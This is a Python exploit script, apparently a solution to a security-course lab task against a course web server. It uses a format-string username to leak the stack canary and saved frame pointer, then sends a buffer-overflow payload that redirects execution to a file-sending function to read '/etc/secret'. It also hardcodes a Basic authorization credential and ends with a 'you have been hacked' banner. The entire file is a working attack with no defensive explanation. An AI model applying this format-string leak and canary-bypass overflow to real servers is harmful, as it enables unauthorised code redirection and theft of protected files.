import binascii
import subprocess

from requests import Session

# Function that converts a hex string to binary and saves it to a file
def hex_to_bin_file(hex_txt):

    binary_txt = bytes.fromhex(hex_txt)
    with open("task_3_binary","wb") as f: f.write(binary_txt)


# Configuration
url = "http://project-2.csec.chatzi.org:8000"
username = "%08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x "
password = ""

# Creating the session for the request
session = Session()
session.auth = (username, password)

# Sending the request
response = session.get(url)

for header, value in response.headers.items():
    values = value.split(' ')[3:]

# Get the values for canary, ebp and post_data_address
canary = values[26]
ebp = values[29]
check_sum_address = values[30]

# Initialize offsets
buffer_offset = -120
send_file_offset = 1581

# Create payload
payload = "/etc/secret".encode("utf-8").hex()

# Add null termanator
payload += '26'

# Fill with something random the rest
payload += 'A' * 80

# Write address of the buffer and make it little endian
buffer_address = bytes.fromhex(hex(int(ebp,16) + buffer_offset)[2:])[::-1].hex()
payload += buffer_address

# Write random word
payload += buffer_address

# Write canary and make it little endian
payload += bytes.fromhex(canary)[::-1].hex()

# Write two random words
payload += buffer_address*2

# Write $ebp
payload += bytes.fromhex(ebp)[::-1].hex()

# Write address of send file
send_file_address = bytes.fromhex(hex(int(check_sum_address,16) + send_file_offset)[2:])[::-1].hex()
payload += send_file_address

# 1 random word
payload += buffer_address

# Write parameter of send file (address of post_data buffer)
payload += buffer_address

# Replace 00 with 26 or 3D
payload = payload.replace("00","26")

#Convert to binary
hex_to_bin_file(payload)

# Send cURL request
curl = "curl --location 'http://project-2.csec.chatzi.org:8000/' --header 'Content-Length: 0' --header 'Content-Type: application/x-www-form-urlencoded' --header 'Authorization: Basic YWRtaW46OGM2ZTJmMzRkZjA4ZTJmODc5ZTYxZWViOWU4YmE5NmY4ZDllOTZkODAzMzg3MGY4MDEyNzU2N2QyNzBkN2Q5Ng==' -i --data-binary '@task_3_binary' --max-time 10"
status, output = subprocess.getstatusoutput(curl)

print("\n/* TASK-3 YOU HAVE BEEN HACKED BY SECURENET */\n")
print(output)
